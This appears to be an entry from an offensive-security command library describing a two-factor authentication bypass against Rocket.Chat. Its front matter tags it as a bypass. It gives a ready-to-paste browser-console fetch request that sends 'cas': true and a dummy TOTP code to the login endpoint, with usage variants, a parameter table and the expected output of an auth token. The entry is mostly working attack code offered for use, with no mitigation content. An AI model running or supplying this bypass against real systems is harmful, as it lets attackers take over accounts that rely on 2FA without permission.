---
data: |-
  fetch('/api/v1/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      user: 'your_username',
      password: 'your_password',
      code: '000000',
      cas: true
    })
  }).then(response => response.json()).then(data => console.log(data));
tags:
  - bypass
  - 2fa
type: command
output: '{"status":"success","data":{"authToken":"...","userId":"..."}}'
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:31:11.178Z'
id: 197ddeab-e8b4-4592-8c1b-35c6065be710
verified: false
validated: true
submitted: true
---
# rocket-chat-2fa-bypass-js

## Command

```javascript
fetch('/api/v1/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    user: 'your_username',
    password: 'your_password',
    code: '000000',
    cas: true
  })
}).then(response => response.json()).then(data => console.log(data));
```

## Description

This JavaScript command, executed in the browser console, sends a modified POST request to Rocket.Chat's login endpoint, including the 'cas': true parameter to bypass TOTP 2FA validation. Use it after inspecting normal requests to exploit the authentication flaw.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user | Target username | Yes |
| password | Valid account password | Yes |
| code | Invalid TOTP code (e.g., '000000') | Yes |
| cas | Set to true to skip 2FA | Yes |

## Examples

### Basic Usage

```javascript
fetch('/api/v1/login', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({user: 'testuser', password: 'testpass', code: '000000', cas: true})
}).then(r => r.json()).then(console.log);
```

### Advanced Usage

Add error handling:

```javascript
fetch('/api/v1/login', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({user: 'testuser', password: 'testpass', code: '000000', cas: true})
}).then(r => r.json()).then(data => {
  if (data.status === 'success') console.log('Bypass successful:', data);
  else console.error('Failed:', data);
}).catch(err => console.error('Error:', err));
```

## Expected Output

Successful execution returns a JSON object with status 'success', an authToken, and userId, granting access without valid TOTP. Failure (without cas) returns 'error' with 2FA validation message.

## Related

- [[procedures/Execute-Rocket.Chat-2FA-Bypass-Script]]
